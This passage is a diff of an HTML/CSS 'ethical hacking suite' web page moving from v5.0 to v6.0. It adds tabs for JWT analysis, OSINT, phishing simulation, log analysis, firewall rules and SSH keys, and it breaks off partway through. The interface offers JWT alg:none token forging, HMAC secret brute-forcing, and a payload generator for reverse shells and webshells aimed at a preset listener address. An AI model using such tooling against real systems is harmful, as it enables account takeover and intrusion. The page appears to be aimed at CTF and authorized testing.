@@ -36,11 +36,15 @@ body::before{content:'';position:fixed;top:0;left:0;width:100%;height:100%;backg
 .nb{background:transparent;border:none;border-right:1px solid #00ff4111;color:#00ff4155;font-family:'Share Tech Mono',monospace;font-size:10px;padding:9px 13px;cursor:pointer;white-space:nowrap;transition:all .2s;-webkit-tap-highlight-color:transparent;}
 .nb:hover,.nb:active{color:var(--g);background:#00ff4108;}
 .nb.active{color:var(--g);background:#001800;border-bottom:2px solid var(--g);}
-.nbadge{background:var(--r);color:#fff;font-size:7px;padding:1px 3px;margin-left:3px;vertical-align:middle;}
+.nb.new-tool{border-bottom:1px solid var(--pu);color:#aa44ff88;}
+.nb.new-tool:hover{color:var(--pu);}
+.nb.new-tool.active{color:var(--pu);border-bottom:2px solid var(--pu);background:#0f001a;}
 .content{padding:16px;max-width:1400px;margin:0 auto;}
 .tp{display:none;}.tp.active{display:block;}
 .stitle{font-family:'Orbitron',sans-serif;font-size:14px;font-weight:700;color:var(--g);text-shadow:var(--glow);margin-bottom:16px;display:flex;align-items:center;gap:10px;}
 .stitle::after{content:'';flex:1;height:1px;background:linear-gradient(90deg,#00ff4144,transparent);}
+.stitle.purple{color:var(--pu);text-shadow:0 0 10px var(--pu);}
+.stitle.purple::after{background:linear-gradient(90deg,#aa44ff44,transparent);}
 .term{background:#000;border:1px solid #00ff4133;font-family:'Share Tech Mono',monospace;font-size:12px;color:var(--g);padding:12px;height:220px;overflow-y:auto;}
 .tl{margin:2px 0;line-height:1.5;word-break:break-all;}
 .tlc{color:var(--c);}.tle{color:var(--r);}.tlw{color:var(--y);}.tls{color:#00ff41;}
@@ -56,7 +60,8 @@ body::before{content:'';position:fixed;top:0;left:0;width:100%;height:100%;backg
 .btn:hover,.btn:active{background:#00ff4122;}
 .btnc{border-color:var(--c);color:var(--c);}.btnc:hover,.btnc:active{background:#00eeff22;}
 .btnr{border-color:var(--r);color:var(--r);}.btnr:hover,.btnr:active{background:#ff003c22;}
-.btny{border-color:var(--y);color:var(--y);}
+.btny{border-color:var(--y);color:var(--y);}.btny:hover{background:#ffe60022;}
+.btnp{border-color:var(--pu);color:var(--pu);}.btnp:hover,.btnp:active{background:#aa44ff22;}
 .btnw{width:100%;text-align:center;}
 .fi{margin-bottom:10px;}
 .fi label{display:block;font-size:9px;color:#00ff4177;margin-bottom:4px;letter-spacing:2px;}
@@ -64,6 +69,7 @@ body::before{content:'';position:fixed;top:0;left:0;width:100%;height:100%;backg
 .fi input:focus,.fi select:focus{border-color:var(--g);}
 .fi textarea{resize:vertical;min-height:70px;}
 .out{background:#000;border:1px solid #00ff4122;padding:10px;font-size:11px;color:var(--c);min-height:44px;word-break:break-all;margin-top:8px;font-family:'Share Tech Mono',monospace;line-height:1.7;}
+.out.purple-out{border-color:#aa44ff33;color:#cc88ff;}
 .sbar{height:5px;background:#002200;border-radius:3px;margin-top:7px;overflow:hidden;}
 .sfill{height:100%;border-radius:3px;transition:width .4s,background .4s;}
 .srow{display:grid;grid-template-columns:repeat(5,1fr);gap:10px;margin-bottom:16px;}
@@ -128,27 +134,55 @@ body::before{content:'';position:fixed;top:0;left:0;width:100%;height:100%;backg
 .ip-row:last-child{border-bottom:none;}
 .spbar{height:18px;background:#002200;border-radius:3px;overflow:hidden;margin:5px 0;}
 .spfill{height:100%;display:flex;align-items:center;padding-left:6px;font-size:9px;color:#000;font-weight:bold;transition:width 1s;}
+/* JWT styles */
+.jwt-part{padding:6px 10px;margin-bottom:6px;border-radius:2px;font-size:11px;line-height:1.8;word-break:break-all;}
+.jwt-header{background:#1a0f00;border-left:3px solid var(--y);color:var(--y);}
+.jwt-payload{background:#001a00;border-left:3px solid var(--g);color:var(--g);}
+.jwt-sig{background:#1a001a;border-left:3px solid var(--pu);color:var(--pu);}
+/* Header grade badges */
+.hgrade{display:inline-block;padding:2px 8px;font-size:10px;font-family:'Orbitron',sans-serif;letter-spacing:2px;}
+.hg-a{background:#002200;border:1px solid var(--g);color:var(--g);}
+.hg-b{background:#001a1a;border:1px solid var(--c);color:var(--c);}
+.hg-c{background:#1a1000;border:1px solid var(--y);color:var(--y);}
+.hg-f{background:#1a0000;border:1px solid var(--r);color:var(--r);}
+/* Regex highlight */
+.rx-match{background:#ffe60033;color:var(--y);border:1px solid #ffe60066;border-radius:2px;}
+/* Log lines */
+.log-err{color:var(--r);background:#1a000011;}
+.log-warn{color:var(--y);}
+.log-ok{color:var(--g);}
+.log-info{color:var(--c);}
+/* OSINT platform cards */
+.plat-card{display:inline-block;padding:4px 10px;margin:3px;font-size:10px;border:1px solid;cursor:default;transition:all .3s;}
+.plat-found{border-color:var(--g);color:var(--g);background:#002200;}
+.plat-notfound{border-color:#333;color:#555;}
+.plat-checking{border-color:var(--y);color:var(--y);background:#1a1000;}
+/* Firewall rules */
+.fw-rule{background:#001200;border:1px solid #00ff4122;padding:8px 10px;margin-bottom:5px;font-size:10px;display:flex;align-items:center;gap:8px;flex-wrap:wrap;}
+.fw-rule .rule-action{padding:2px 8px;font-size:9px;font-family:'Orbitron',sans-serif;}
+.rule-accept{background:#002200;border:1px solid var(--g);color:var(--g);}
+.rule-drop{background:#1a0000;border:1px solid var(--r);color:var(--r);}
+.rule-reject{background:#1a1000;border:1px solid var(--y);color:var(--y);}
+/* New tool banner */
+.new-badge{background:#0f001a;border:1px solid var(--pu);color:var(--pu);font-size:8px;padding:1px 5px;margin-left:4px;font-family:'Orbitron',sans-serif;letter-spacing:1px;vertical-align:middle;}
 @keyframes glitch{0%{text-shadow:2px 0 var(--r),-2px 0 var(--c);}50%{text-shadow:-2px 0 var(--r),2px 0 var(--c);}100%{text-shadow:2px 0 var(--r),-2px 0 var(--c);}}
 .glitch{animation:glitch 3s infinite;}
 @keyframes blink{50%{opacity:0;}}.blink{animation:blink 1s step-end infinite;}
-@media(max-width:700px){
-  .srow{grid-template-columns:repeat(3,1fr);}
-  .g2{grid-template-columns:1fr;}
-  .g3{grid-template-columns:1fr;}
-  .lbox{padding:24px 16px;}
-}
+@keyframes pulse-pu{0%,100%{box-shadow:0 0 5px #aa44ff44;}50%{box-shadow:0 0 15px #aa44ff88;}}
+.pulse-pu{animation:pulse-pu 2s infinite;}
+@media(max-width:700px){.srow{grid-template-columns:repeat(3,1fr);}.g2{grid-template-columns:1fr;}.g3{grid-template-columns:1fr;}.lbox{padding:24px 16px;}}
 @media(max-width:400px){.srow{grid-template-columns:repeat(2,1fr);}}
 ::-webkit-scrollbar{width:4px;}::-webkit-scrollbar-track{background:#000;}::-webkit-scrollbar-thumb{background:#00ff4122;}
 </style>
 </head>
 <body>
 <canvas id="mc"></canvas>
-
+ 
 <!-- LOGIN -->
 <div id="login">
 <div class="lbox">
 <div class="llogo">&#9889; SANDESH ETH-HACK</div>
-<div class="lsub">ADVANCED ETHICAL HACKING SUITE v5.0</div>
+<div class="lsub">ADVANCED ETHICAL HACKING SUITE v6.0</div>
 <div class="lf"><label>&#9658; USERNAME / EMAIL</label><input type="text" id="lu" placeholder="root@sandesh.local" autocomplete="off" autocorrect="off" autocapitalize="off"></div>
 <div class="lf"><label>&#9658; PASSWORD</label><input type="password" id="lp" placeholder="••••••••••" onkeydown="if(event.key==='Enter')doLogin()"></div>
 <button class="lbtn" onclick="doLogin()">[ AUTHENTICATE ]</button>
@@ -156,11 +190,11 @@ body::before{content:'';position:fixed;top:0;left:0;width:100%;height:100%;backg
 <div class="lstat" id="lst"></div>
 </div>
 </div>
-
+ 
 <!-- APP -->
 <div id="app">
 <div class="hdr">
-<div class="hlogo">&#9889; <span>SANDESH</span> ETH-HACK v5.0</div>
+<div class="hlogo">&#9889; <span>SANDESH</span> ETH-HACK v6.0</div>
 <div style="font-size:9px;color:#00ff4166"><span class="blink">&#9679;</span> LIVE</div>
 <div class="ubadge" id="ub">root</div>
 <button class="lobtn" onclick="logout()">LOGOUT</button>
@@ -182,19 +216,31 @@ body::before{content:'';position:fixed;top:0;left:0;width:100%;height:100%;backg
 <button class="nb" onclick="showTab('wifi')">&#128246; WIFI</button>
 <button class="nb" onclick="showTab('net')">&#127760; NETWORK</button>
 <button class="nb" onclick="showTab('ai')">&#129302; AI</button>
+<!-- NEW ADVANCED TOOLS -->
+<button class="nb new-tool" onclick="showTab('jwt')">&#128273; JWT<span class="new-badge">NEW</span></button>
+<button class="nb new-tool" onclick="showTab('osint')">&#128270; OSINT<span class="new-badge">NEW</span></button>
+<button class="nb new-tool" onclick="showTab('regex')">&#128295; REGEX<span class="new-badge">NEW</span></button>
+<button class="nb new-tool" onclick="showTab('headers')">&#127760; HDR SCAN<span class="new-badge">NEW</span></button>
+<button class="nb new-tool" onclick="showTab('phishing')">&#128231; PHISH<span class="new-badge">NEW</span></button>
+<button class="nb new-tool" onclick="showTab('logs')">&#128203; LOG ANAL<span class="new-badge">NEW</span></button>
+<button class="nb new-tool" onclick="showTab('firewall')">&#128737; FIREWALL<span class="new-badge">NEW</span></button>
+<button class="nb new-tool" onclick="showTab('sshkey')">&#128272; SSH KEY<span class="new-badge">NEW</span></button>
 <button class="nb" onclick="showTab('game')">&#127918; GAME</button>
 </div>
 <div class="content">
-
+ 
 <!-- DASHBOARD -->
 <div class="tp active" id="tab-dash">
-<div class="stitle glitch">COMMAND CENTER v5.0</div>
+<div class="stitle glitch">COMMAND CENTER v6.0</div>
 <div class="srow">
 <div class="sc"><div class="snum" id="ss">0</div><div class="slbl">SCANS</div></div>
 <div class="sc"><div class="snum" id="sp">0</div><div class="slbl">PASSWORDS</div></div>
 <div class="sc"><div class="snum" id="sc2">0</div><div class="slbl">CTF</div></div>
-<div class="sc"><div class="snum" id="sa">0</div><div class="slbl">AI</div></div>
+<div class="sc"><div class="snum" id="sa">0</div><div class="slbl">AI QUERIES</div></div>
 <div class="sc"><div class="snum" id="sg">0</div><div class="slbl">SCORE</div></div>
+</div>
+<div style="background:#0f001a;border:1px solid #aa44ff44;padding:8px 12px;margin-bottom:14px;font-size:10px;color:var(--pu)">
+&#9889; v6.0 — 8 NEW TOOLS: JWT Analyzer · OSINT Username · Regex Tester · Header Scanner · Phishing Sim · Log Analyzer · Firewall Builder · SSH Key Gen
 </div>
 <div class="g2">
 <div>
@@ -204,20 +250,20 @@ body::before{content:'';position:fixed;top:0;left:0;width:100%;height:100%;backg
 <div>
 <div class="stitle" style="font-size:12px">&#128203; QUICK LAUNCH</div>
 <div class="g3">
+<div class="card" onclick="showTab('jwt')" style="border-color:#aa44ff33"><span class="ci">&#128273;</span><div class="ct" style="color:var(--pu)">JWT ANALYZER</div></div>
+<div class="card" onclick="showTab('osint')" style="border-color:#aa44ff33"><span class="ci">&#128270;</span><div class="ct" style="color:var(--pu)">OSINT USERNAME</div></div>
+<div class="card" onclick="showTab('regex')" style="border-color:#aa44ff33"><span class="ci">&#128295;</span><div class="ct" style="color:var(--pu)">REGEX TESTER</div></div>
+<div class="card" onclick="showTab('headers')" style="border-color:#aa44ff33"><span class="ci">&#127760;</span><div class="ct" style="color:var(--pu)">HDR SCANNER</div></div>
+<div class="card" onclick="showTab('phishing')" style="border-color:#aa44ff33"><span class="ci">&#128231;</span><div class="ct" style="color:var(--pu)">PHISHING SIM</div></div>
+<div class="card" onclick="showTab('logs')" style="border-color:#aa44ff33"><span class="ci">&#128203;</span><div class="ct" style="color:var(--pu)">LOG ANALYZER</div></div>
+<div class="card" onclick="showTab('firewall')" style="border-color:#aa44ff33"><span class="ci">&#128737;</span><div class="ct" style="color:var(--pu)">FIREWALL</div></div>
+<div class="card" onclick="showTab('sshkey')" style="border-color:#aa44ff33"><span class="ci">&#128272;</span><div class="ct" style="color:var(--pu)">SSH KEY GEN</div></div>
 <div class="card" onclick="showTab('scan')"><span class="ci">&#128163;</span><div class="ct">VULN SCAN</div></div>
-<div class="card" onclick="showTab('pkt')"><span class="ci">&#128225;</span><div class="ct">PACKETS</div></div>
-<div class="card" onclick="showTab('ctf')"><span class="ci">&#127942;</span><div class="ct">CTF LAB</div></div>
-<div class="card" onclick="showTab('dark')"><span class="ci">&#128565;</span><div class="ct">DARK WEB</div></div>
-<div class="card" onclick="showTab('payload')"><span class="ci">&#128296;</span><div class="ct">PAYLOADS</div></div>
-<div class="card" onclick="showTab('nmap')"><span class="ci">&#127760;</span><div class="ct">NET MAP</div></div>
-<div class="card" onclick="showTab('iptools')"><span class="ci">&#127757;</span><div class="ct">IP TOOLS</div></div>
-<div class="card" onclick="showTab('encode')"><span class="ci">&#128272;</span><div class="ct">ENCODER</div></div>
-<div class="card" onclick="showTab('ai')"><span class="ci">&#129302;</span><div class="ct">AI ASSIST</div></div>
 </div>
 </div>
 </div>
 </div>
-
+ 
 <!-- TERMINAL -->
 <div class="tp" id="tab-term">
 <div class="stitle">KALI LINUX TERMINAL</div>
@@ -227,7 +273,7 @@ body::before{content:'';position:fixed;top:0;left:0;width:100%;height:100%;backg
 <input class="ti" id="ti" placeholder="type command..." onkeydown="handleTermKey(event)" autocomplete="off" spellcheck="false" autocorrect="off" autocapitalize="off">
 </div>
 </div>
-
+ 
 <!-- PASSWORD GENERATOR -->
 <div class="tp" id="tab-pass">
 <div class="stitle">PASSWORD GENERATOR</div>
@@ -256,7 +302,7 @@ body::before{content:'';position:fixed;top:0;left:0;width:100%;height:100%;backg
 </div>
 </div>
 </div>
-
+ 
 <!-- RECON -->
 <div class="tp" id="tab-recon">
 <div class="stitle">&#128269; RECON FRAMEWORK</div>
@@ -264,13 +310,7 @@ body::before{content:'';position:fixed;top:0;left:0;width:100%;height:100%;backg
 <div class="g2">
 <div>
 <div class="fi"><label>TARGET</label><input id="rt" placeholder="example.com or 192.168.1.1"></div>
-<div class="fi"><label>TYPE</label>
-<select id="rtype">
-<option value="whois">WHOIS LOOKUP</option><option value="dns">DNS ENUMERATION</option>
-<option value="subdomain">SUBDOMAIN FINDER</option><option value="tech">TECH FINGERPRINT</option>
-<option value="headers">HTTP HEADERS</option><option value="osint">OSINT SCAN</option>
-<option value="geo">GEO IP LOOKUP</option><option value="shodan">SHODAN-STYLE</option>
-</select></div>
+<div class="fi"><label>TYPE</label><select id="rtype"><option value="whois">WHOIS LOOKUP</option><option value="dns">DNS ENUMERATION</option><option value="subdomain">SUBDOMAIN FINDER</option><option value="tech">TECH FINGERPRINT</option><option value="headers">HTTP HEADERS</option><option value="osint">OSINT SCAN</option><option value="geo">GEO IP LOOKUP</option><option value="shodan">SHODAN-STYLE</option></select></div>
 <button class="btn btnw" onclick="runRecon()" id="rb">&#128269; RUN RECON</button>
 <div class="pbar"><div class="pfill" id="rp" style="width:0%"></div></div>
 <div style="font-size:9px;color:#00ff4155;margin-top:3px" id="rs">READY</div>
@@ -278,7 +318,7 @@ body::before{content:'';position:fixed;top:0;left:0;width:100%;height:100%;backg
 <div><div class="out" id="ro" style="min-height:260px;white-space:pre-line">Run a scan...</div></div>
 </div>
 </div>
-
+ 
 <!-- VULN SCANNER -->
 <div class="tp" id="tab-scan">
 <div class="stitle">&#128163; VULNERABILITY SCANNER</div>
@@ -286,12 +326,7 @@ body::before{content:'';position:fixed;top:0;left:0;width:100%;height:100%;backg
 <div class="g2">
 <div>
 <div class="fi"><label>TARGET</label><input id="vtgt" placeholder="http://example.com"></div>
-<div class="fi"><label>TYPE</label>
-<select id="vstype">
-<option value="full">FULL SCAN</option><option value="web">WEB APP</option>
-<option value="network">NETWORK</option><option value="ssl">SSL/TLS</option>
-<option value="cms">CMS</option><option value="api">API</option>
-</select></div>
+<div class="fi"><label>TYPE</label><select id="vstype"><option value="full">FULL SCAN</option><option value="web">WEB APP</option><option value="network">NETWORK</option><option value="ssl">SSL/TLS</option><option value="cms">CMS</option><option value="api">API</option></select></div>
 <div class="fi"><label>INTENSITY</label><select id="vint"><option>STEALTH</option><option selected>NORMAL</option><option>AGGRESSIVE</option></select></div>
 <button class="btn btnw" onclick="runScan()" id="vsb">&#128163; SCAN</button>
 <div class="pbar" style="margin-top:7px"><div class="pfill" id="vsp" style="width:0%"></div></div>
@@ -301,7 +336,7 @@ body::before{content:'';position:fixed;top:0;left:0;width:100%;height:100%;backg
 <div><div style="font-size:9px;color:#00ff4177;margin-bottom:6px">VULNERABILITIES</div><div id="vres" style="max-height:400px;overflow-y:auto"><div style="color:#00ff4144;font-size:11px;padding:16px;text-align:center">Run a scan</div></div></div>
 </div>
 </div>
-
+ 
 <!-- PACKET ANALYZER -->
 <div class="tp" id="tab-pkt">
 <div class="stitle">&#128225; LIVE PACKET ANALYZER</div>
@@ -313,11 +348,7 @@ body::before{content:'';position:fixed;top:0;left:0;width:100%;height:100%;backg
 <button class="btn btnw" onclick="startCap()" id="capb">&#9654; CAPTURE</button>
 <button class="btn btnr btnw" onclick="stopCap()" id="stopb" disabled>&#9632; STOP</button>
 </div>
-<div style="margin-top:12px;font-size:10px;line-height:2;color:#00ff41bb">
-TCP:<span id="stcp">0</span> UDP:<span id="sudp">0</span><br>
-HTTP:<span id="shttp">0</span> DNS:<span id="sdns">0</span><br>
-ARP:<span id="sarp">0</span> Total:<span id="stot">0</span>
-</div>
+<div style="margin-top:12px;font-size:10px;line-height:2;color:#00ff41bb">TCP:<span id="stcp">0</span> UDP:<span id="sudp">0</span><br>HTTP:<span id="shttp">0</span> DNS:<span id="sdns">0</span><br>ARP:<span id="sarp">0</span> Total:<span id="stot">0</span></div>
 <div style="margin-top:10px;font-size:10px;color:var(--r);line-height:1.8" id="palerts"></div>
 </div>
 <div>
@@ -326,7 +357,7 @@ ARP:<span id="sarp">0</span> Total:<span id="stot">0</span>
 </div>
 </div>
 </div>
-
+ 
 <!-- NETWORK MAP -->
 <div class="tp" id="tab-nmap">
 <div class="stitle">&#127760; NETWORK TOPOLOGY MAP</div>
@@ -341,7 +372,7 @@ ARP:<span id="sarp">0</span> Total:<span id="stot">0</span>
 <div><canvas id="nmc"></canvas></div>
 </div>
 </div>
-
+ 
 <!-- CTF LAB -->
 <div class="tp" id="tab-ctf">
 <div class="stitle">&#127942; CTF CHALLENGE LAB</div>
@@ -362,7 +393,7 @@ ARP:<span id="sarp">0</span> Total:<span id="stot">0</span>
 </div>
 </div>
 </div>
-
+ 
 <!-- DARK WEB MONITOR -->
 <div class="tp" id="tab-dark">
 <div class="stitle">&#128565; DARK WEB BREACH MONITOR</div>
@@ -390,39 +421,28 @@ ARP:<span id="sarp">0</span> Total:<span id="stot">0</span>
 </div>
 </div>
 </div>
-
+ 
 <!-- PAYLOAD GENERATOR -->
 <div class="tp" id="tab-payload">
 <div class="stitle">&#128296; PAYLOAD GENERATOR</div>
 <div style="background:#1a0800;border:1px solid #ff660033;padding:7px 10px;margin-bottom:12px;font-size:10px;color:#ff9944">&#9888; CTF/authorized pen testing only.</div>
 <div class="g2">
 <div>
-<div class="fi"><label>TYPE</label>
-<select id="ptyp" onchange="updatePayload()">
-<option value="xss">XSS Payloads</option><option value="sqli">SQL Injection</option>
-<option value="rce">Command Injection</option><option value="lfi">LFI/Path Traversal</option>
-<option value="ssti">SSTI Templates</option><option value="xxe">XXE Injection</option>
-<option value="ssrf">SSRF Payloads</option><option value="rev">Reverse Shell Bash</option>
-<option value="python">Python Rev Shell</option><option value="php">PHP Webshell Demo</option>
-</select></div>
+<div class="fi"><label>TYPE</label><select id="ptyp" onchange="updatePayload()"><option value="xss">XSS Payloads</option><option value="sqli">SQL Injection</option><option value="rce">Command Injection</option><option value="lfi">LFI/Path Traversal</option><option value="ssti">SSTI Templates</option><option value="xxe">XXE Injection</option><option value="ssrf">SSRF Payloads</option><option value="rev">Reverse Shell Bash</option><option value="python">Python Rev Shell</option><option value="php">PHP Webshell Demo</option></select></div>
 <div class="fi"><label>LHOST</label><input id="lhost" value="10.10.14.5" oninput="updatePayload()"></div>
 <div class="fi"><label>LPORT</label><input id="lport" value="4444" oninput="updatePayload()"></div>
 <button class="btn btnw" onclick="updatePayload()">&#128296; GENERATE</button>
-<div style="margin-top:12px"><div class="fi"><label>ENCODER</label>
-<select id="penc" onchange="encodePayload()">
-<option value="none">NONE</option><option value="base64">BASE64</option>
-<option value="url">URL ENCODE</option><option value="hex">HEX</option><option value="html">HTML ENTITIES</option>
-</select></div></div>
+<div style="margin-top:12px"><div class="fi"><label>ENCODER</label><select id="penc" onchange="encodePayload()"><option value="none">NONE</option><option value="base64">BASE64</option><option value="url">URL ENCODE</option><option value="hex">HEX</option><option value="html">HTML ENTITIES</option></select></div></div>
 </div>
 <div>
-<div class="out" id="payouts" style="min-height:180px;white-space:pre-line">Select type...</div>
+<div class="out" id="payouts" style="min-height:180px;white-space:pre-wrap">Select type...</div>
 <button class="btn btnc btnw" style="margin-top:7px" onclick="navigator.clipboard.writeText(document.getElementById('payouts').textContent).then(()=>{event.target.textContent='COPIED!';setTimeout(()=>event.target.textContent='COPY',1400)})">&#x2398; COPY</button>
 <div style="margin-top:10px"><div style="font-size:9px;color:#00ff4177;margin-bottom:5px">ENCODED</div>
 <div class="out" id="payenc" style="min-height:60px">...</div></div>
 </div>
 </div>
 </div>
-
+ 
 <!-- IP TOOLS -->
 <div class="tp" id="tab-iptools">
 <div class="stitle">&#127757; ADVANCED IP TOOLS</div>
@@ -453,7 +473,7 @@ ARP:<span id="sarp">0</span> Total:<span id="stot">0</span>
 </div>
 </div>
 </div>
-
+ 
 <!-- ENCODER -->
 <div class="tp" id="tab-encode">
 <div class="stitle">&#128272; ADVANCED ENCODER</div>
@@ -467,15 +487,7 @@ ARP:<span id="sarp">0</span> Total:<span id="stot">0</span>
 </div>
 <div class="cpanel active" id="enc-basic">
 <div class="fi"><label>INPUT</label><textarea id="ei" style="min-height:70px"></textarea></div>
-<div class="fi"><label>METHOD</label>
-<select id="em" onchange="document.getElementById('csr').style.display=this.value==='caesar'?'block':'none'">
-<option value="b64e">BASE64 ENCODE</option><option value="b64d">BASE64 DECODE</option>
-<option value="hex">TEXT TO HEX</option><option value="unhex">HEX TO TEXT</option>
-<option value="bin">TEXT TO BINARY</option><option value="unbin">BINARY TO TEXT</option>
-<option value="url">URL ENCODE</option><option value="unurl">URL DECODE</option>
-<option value="rot13">ROT13</option><option value="morse">MORSE CODE</option>
-<option value="reverse">REVERSE</option><option value="caesar">CAESAR</option><option value="atbash">ATBASH</option>
-</select></div>
+<div class="fi"><label>METHOD</label><select id="em" onchange="document.getElementById('csr').style.display=this.value==='caesar'?'block':'none'"><option value="b64e">BASE64 ENCODE</option><option value="b64d">BASE64 DECODE</option><option value="hex">TEXT TO HEX</option><option value="unhex">HEX TO TEXT</option><option value="bin">TEXT TO BINARY</option><option value="unbin">BINARY TO TEXT</option><option value="url">URL ENCODE</option><option value="unurl">URL DECODE</option><option value="rot13">ROT13</option><option value="morse">MORSE CODE</option><option value="reverse">REVERSE</option><option value="caesar">CAESAR</option><option value="atbash">ATBASH</option></select></div>
 <div class="fi" id="csr" style="display:none"><label>SHIFT</label><input type="number" id="cshift" value="13" min="1" max="25"></div>
 <button class="btn btnw" onclick="runEnc()">PROCESS</button>
 </div>
@@ -483,19 +495,13 @@ ARP:<span id="sarp">0</span> Total:<span id="stot">0</span>
 <div class="fi"><label>INPUT</label><textarea id="ci" style="min-height:60px"></textarea></div>
 <div class="fi"><label>KEY</label><input id="ck" placeholder="Secret key..."></div>
 <div class="fi"><label>ALGORITHM</label><select id="ca"><option value="xor">XOR</option><option value="vigenere">VIGENERE</option><option value="atbash">ATBASH</option></select></div>
-<div style="display:flex;gap:7px">
-<button class="btn btnw" onclick="runCrypt(1)">ENCRYPT</button>
-<button class="btn btnc btnw" onclick="runCrypt(0)">DECRYPT</button>
-</div>
+<div style="display:flex;gap:7px"><button class="btn btnw" onclick="runCrypt(1)">ENCRYPT</button><button class="btn btnc btnw" onclick="runCrypt(0)">DECRYPT</button></div>
 <div class="out" id="cex" style="font-size:10px;min-height:40px;margin-top:7px">...</div>
 </div>
 <div class="cpanel" id="enc-stego">
 <div class="fi"><label>SECRET MESSAGE</label><textarea id="stmsg" style="min-height:55px"></textarea></div>
 <div class="fi"><label>COVER TEXT</label><textarea id="stcover" style="min-height:60px"></textarea></div>
-<div style="display:flex;gap:7px">
-<button class="btn btnw" onclick="stHide()">HIDE</button>
-<button class="btn btnc btnw" onclick="stReveal()">REVEAL</button>
-</div>
+<div style="display:flex;gap:7px"><button class="btn btnw" onclick="stHide()">HIDE</button><button class="btn btnc btnw" onclick="stReveal()">REVEAL</button></div>
 </div>
 <div class="cpanel" id="enc-qr">
 <div class="fi"><label>TEXT / URL</label><input id="qrtext" placeholder="https://example.com"></div>
@@ -525,7 +531,7 @@ ARP:<span id="sarp">0</span> Total:<span id="stot">0</span>
 </div>
 </div>
 </div>
-
+ 
 <!-- EXPLOIT DB -->
 <div class="tp" id="tab-exploit">
 <div class="stitle">&#128163; EXPLOIT DATABASE</div>
@@ -542,7 +548,7 @@ ARP:<span id="sarp">0</span> Total:<span id="stot">0</span>
 </div>
 </div>
 </div>
-
+ 
 <!-- WIFI -->
 <div class="tp" id="tab-wifi">
 <div class="stitle">&#128246; WIFI SECURITY</div>
@@ -566,7 +572,7 @@ ARP:<span id="sarp">0</span> Total:<span id="stot">0</span>
 </div>
 </div>
 </div>
-
+ 
 <!-- NETWORK TOOLS -->
 <div class="tp" id="tab-net">
 <div class="stitle">&#127760; NETWORK TOOLS</div>
@@ -590,7 +596,7 @@ ARP:<span id="sarp">0</span> Total:<span id="stot">0</span>
 </div>
 </div>
 </div>
-
+ 
 <!-- AI ASSISTANT -->
 <div class="tp" id="tab-ai">
 <div class="stitle">&#129302; SANDESH-AI — POWERED BY CLAUDE</div>
@@ -609,11 +615,306 @@ ARP:<span id="sarp">0</span> Total:<span id="stot">0</span>
 <div>
 <div class="stitle" style="font-size:12px">QUICK PROMPTS</div>
 <div style="display:flex;flex-direction:column;gap:6px">
+<button class="btn btnw" style="text-align:left;font-size:10px" onclick="setPrompt('Explain SQL injection with examples')">&#9658; Explain SQL injection</button>
+<button class="btn btnw" style="text-align:left;font-size:10px" onclick="setPrompt('What is XSS and how to prevent it?')">&#9658; What is XSS?</button>
+<button class="btn btnw" style="text-align:left;font-size:10px" onclick="setPrompt('How does a reverse shell work?')">&#9658; How reverse shells work</button>
+<button class="btn btnw" style="text-align:left;font-size:10px" onclick="setPrompt('What are the OWASP Top 10 vulnerabilities?')">&#9658; OWASP Top 10</button>
+<button class="btn btnw" style="text-align:left;font-size:10px" onclick="setPrompt('Write a Python port scanner script')">&#9658; Python port scanner</button>
+<button class="btn btnw" style="text-align:left;font-size:10px" onclick="setPrompt('Explain how JWT tokens work and common attacks')">&#9658; JWT attacks</button>
+<button class="btn btnw" style="text-align:left;font-size:10px" onclick="setPrompt('What is Metasploit and how is it used?')">&#9658; Metasploit guide</button>
+<button class="btn btnw" style="text-align:left;font-size:10px" onclick="setPrompt('Explain buffer overflow vulnerabilities')">&#9658; Buffer overflow</button>
+<button class="btn btnw" style="text-align:left;font-size:10px" onclick="setPrompt('What is privilege escalation in Linux?')">&#9658; Linux priv escalation</button>
+<button class="btn btnw" style="text-align:left;font-size:10px" onclick="setPrompt('How do phishing attacks work technically?')">&#9658; Phishing techniques</button>
 </div>
 </div>
 </div>
 </div>
-
+ 
+<!-- ═══════════════════════════════════════════════════
+     NEW TOOL 1: JWT ANALYZER
+═══════════════════════════════════════════════════ -->
+<div class="tp" id="tab-jwt">
+<div class="stitle purple pulse-pu">&#128273; JWT TOKEN ANALYZER</div>
+<div style="background:#0f001a;border:1px solid #aa44ff33;padding:7px 10px;margin-bottom:12px;font-size:10px;color:#aa44ff88">&#9672; Decode, inspect, and audit JWT tokens for security misconfigurations.</div>
+<div class="g2">
+<div>
+<div class="fi"><label>PASTE JWT TOKEN</label><textarea id="jwt-input" style="min-height:90px;border-color:#aa44ff33;background:#0a0010;color:#cc88ff" placeholder="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IlNhbmRlc2giLCJpYXQiOjE1MTYyMzkwMjJ9.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"></textarea></div>
+<div style="display:flex;gap:7px">
+<button class="btn btnp btnw" onclick="analyzeJWT()">&#128273; DECODE & ANALYZE</button>
+<button class="btn btnw" onclick="document.getElementById('jwt-input').value='eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0IiwibmFtZSI6Ikhhd2tlciIsInJvbGUiOiJ1c2VyIn0.'">LOAD ALG:NONE</button>
+</div>
+<div style="margin-top:10px">
+<div class="fi"><label>BRUTE FORCE HMAC SECRET</label><input id="jwt-secret-guess" placeholder="secret, password, 123456..." style="border-color:#aa44ff33;background:#0a0010;color:#cc88ff"></div>
+<button class="btn btnp btnw" onclick="bruteJWTSecret()">&#128272; VERIFY SECRET</button>
+<div class="out purple-out" id="jwt-brute" style="font-size:10px;min-height:36px">...</div>
+</div>
+<div style="margin-top:10px">
+<div class="fi"><label>FORGE TOKEN (CTF DEMO)</label><textarea id="jwt-payload-forge" style="min-height:55px;border-color:#aa44ff33;background:#0a0010;color:#cc88ff" placeholder='{"sub":"admin","role":"admin","iat":1234567890}'></textarea></div>
+<button class="btn btnr btnw" onclick="forgeJWT()">&#128296; FORGE (ALG:NONE)</button>
+<div class="out" id="jwt-forged" style="font-size:10px;min-height:36px;border-color:#ff003c33;color:#ff6666">...</div>
+</div>
+</div>
+<div>
+<div style="font-size:9px;color:#aa44ff88;margin-bottom:7px">TOKEN ANALYSIS</div>
+<div id="jwt-output" style="min-height:320px">
+<div style="color:#aa44ff33;font-size:11px;padding:16px;text-align:center">Paste a JWT token and click DECODE</div>
+</div>
+<div style="margin-top:10px" id="jwt-vulns"></div>
+</div>
+</div>
+</div>
+ 
+<!-- ═══════════════════════════════════════════════════
